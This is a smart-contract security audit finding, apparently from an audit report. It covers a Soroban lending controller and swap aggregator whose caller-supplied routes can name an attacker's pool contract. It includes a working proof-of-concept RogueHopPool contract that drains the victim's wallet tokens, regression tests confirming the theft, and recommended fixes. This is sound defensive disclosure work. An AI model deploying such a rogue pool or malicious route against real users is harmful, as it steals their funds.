### Title

Untrusted swap routes can execute malicious pool code that steals caller wallet funds through the signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary

Controller strategy routes are opaque caller-controlled XDR payloads passed to the configured router. The router decodes attacker-selected pool and token addresses and invokes those contracts without an allowlist. Because those contracts execute below the caller-authorized controller or router invocation, malicious pool code can add a token transfer from the caller to the transaction's simulated authorization tree. If the signed tree is accepted, the arbitrary pool code can steal wallet assets unrelated to the protocol swap while still returning enough output for the strategy to succeed.

### Finding Description

`swap_tokens` accepts a `StrategySwap` payload, authorizes only the exact input-token transfer to the configured router, and invokes `execute_strategy` without validating route destinations. [1](#0-0)  The router decodes caller-provided `StrategyPayload` XDR and executes the contained instruction stream. [2](#0-1)  Its `assets` registry contains route-selected token and pool addresses, while packed operations select those addresses by index. [3](#0-2) 

There is no registry, pool allowlist, or contract-hash check before dispatch. `dispatch_hop` sends each decoded `SwapHop` to a venue adapter and only validates measured input and output balances afterward. [4](#0-3)  For example, the Soroswap adapter calls `get_reserves` and `swap` directly on the payload-selected `hop.pool`. [5](#0-4)  Phoenix likewise invokes `swap` on `hop.pool` after authorizing the pool to pull router input. [6](#0-5) 

The measured-output checks do not bound side effects. A malicious contract implementing the selected venue's expected ABI can satisfy the swap result while also calling `token.transfer(caller, attacker, amount)`. The host records that caller-authorized transfer as a child of the strategy authorization; the regression test demonstrates simulation recording the malicious transfer under `swap_collateral`. [7](#0-6)  In enforcing mode, the same transfer executes when the simulated child authorization is signed. [8](#0-7) 

### Impact Explanation

An attacker can steal any token balance held by a swap user, including assets never supplied to or listed by the lending protocol. The malicious pool can target the victim's full balance because the stolen transfer is not constrained by `total_in`, `min_out`, the controller's measured output, or final account-risk checks.

Reachable strategy entrypoints include `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply`; all can pass caller-provided route bytes into `swap_tokens`. A direct `execute_strategy` call exposes the same primitive. The attack therefore causes theft of user funds, not merely poor execution or MEV.

### Likelihood Explanation

An unprivileged attacker can deploy a contract that implements the selected pool ABI and construct a route naming it as the hop pool. The malicious contract can return a sufficient output or coordinate with attacker-controlled liquidity so the enclosing strategy succeeds.

Exploitation requires the victim to submit and authorize a transaction containing the malicious route. Wallet or quote integrations that rely on transaction simulation will surface the extra child authorization, but a user who signs it grants the malicious transfer. The tested transaction shows that a fair strategy output and the wallet theft can occur in the same successful call.

### Recommendation

Do not let route data select arbitrary executable contracts. Maintain an on-chain allowlist of approved pool addresses or approved pool contract Wasm hashes and reject every hop whose target is not listed.

Additionally:

- Bind each route to a strict structural schema and expected venue ABI.
- Reject unrecognized token, pool, or receiver addresses before dispatch.
- Require clients to reject authorization trees containing unexpected child invocations.
- Document and enforce the exact expected authorization shape for `execute_strategy` and every controller strategy using router bytes.
- Add a regression test using a production-router-compatible malicious pool that satisfies the venue ABI while attempting an unrelated caller-token transfer.

### Proof of Concept

1. Deploy `RogueHopPool` with a stored plan `(victim, wallet_token, attacker, wallet_balance)`. Its venue-compatible `swap` implementation calls:
   ```rust
   token::Client::new(&env, &wallet_token)
       .transfer(&victim, &attacker, &wallet_balance);
   ```
   The test fixture uses this behavior. [9](#0-8) 
2. Construct a strategy payload whose hop pool address is the rogue contract and whose input/output tokens are valid listed assets.
3. Have the victim call `swap_collateral(caller=victim, account_id, collateral=USDC, amount=50_000_000_000, target=ETH, route=<malicious payload>)`.
4. Simulation records `wallet_token.transfer(victim, attacker, wallet_balance)` as a child of the victim's `swap_collateral` authorization. [10](#0-9) 
5. Submit the transaction with the simulated authorization tree. The strategy receives its fair output, while the victim's unrelated wallet token balance becomes zero and the attacker receives `WALLET_BALANCE`. [8](#0-7)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/lib.rs (L245-255)
```rust
    /// Decodes `swap_xdr` as a `StrategyPayload` and runs it for `sender`.
    ///
    /// Requires `sender` authorization. Pulls `total_in` of the input token, runs the
    /// instruction stream, applies fees, checks the minimum output, and returns the amount
    /// delivered to `sender`. Panics with `Error::InvalidRouteXdr` if the XDR does not decode.
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        renew_instance(&env);
        let payload = StrategyPayload::from_xdr(&env, &swap_xdr)
            .unwrap_or_else(|_| panic_with_error!(&env, Error::InvalidRouteXdr));
        execute::run(env, sender, total_in, payload)
    }
```

**File:** contracts/swap-aggregator/src/types.rs (L21-44)
```rust
/// One pool hop: swaps `token_in` for `token_out` through `venue`.
///
/// Built per instruction from registry indices; venue adapters consume this.
#[derive(Clone, Debug)]
pub struct SwapHop {
    pub pool: Address,
    pub token_in: Address,
    pub token_out: Address,
    pub venue: SwapVenue,
}

/// Full strategy decoded from `execute_strategy` XDR.
///
/// Instructions reference `assets` and `amounts` by `u8` index, so an address
/// or amount used by several hops is carried exactly once.
#[contracttype]
#[derive(Clone, Debug)]
pub struct StrategyPayload {
    /// Amount registry: min-out, fixed inputs, burn floors, mint min-shares.
    pub amounts: Vec<i128>,
    /// Address registry: tokens, pools, and LP share tokens.
    pub assets: Vec<Address>,
    /// Packed program: header, instruction records, split weights.
    pub ops: Bytes,
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L51-87)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let token_in_is_0 = ctx.hop.token_in < ctx.hop.token_out;

    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
    let (reserve_in, reserve_out) = if token_in_is_0 {
        (reserve_0, reserve_1)
    } else {
        (reserve_1, reserve_0)
    };

    let requested_out = soroswap_amount_out(ctx.env, ctx.amount_in, reserve_in, reserve_out);
    if requested_out <= 0 {
        panic_with_error!(ctx.env, Error::ZeroOutput);
    }

    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/phoenix.rs (L11-25)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let args: Vec<Val> = vec![
        ctx.env,
        ctx.router.into_val(ctx.env),
        ctx.hop.token_in.into_val(ctx.env),
        ctx.amount_in.into_val(ctx.env),
        Option::<i128>::None.into_val(ctx.env),
        Option::<i64>::None.into_val(ctx.env),
        Option::<u64>::None.into_val(ctx.env),
        Option::<i64>::None.into_val(ctx.env),
    ];
    ctx.authorize_pool_pull();
    let _: i128 = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-71)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
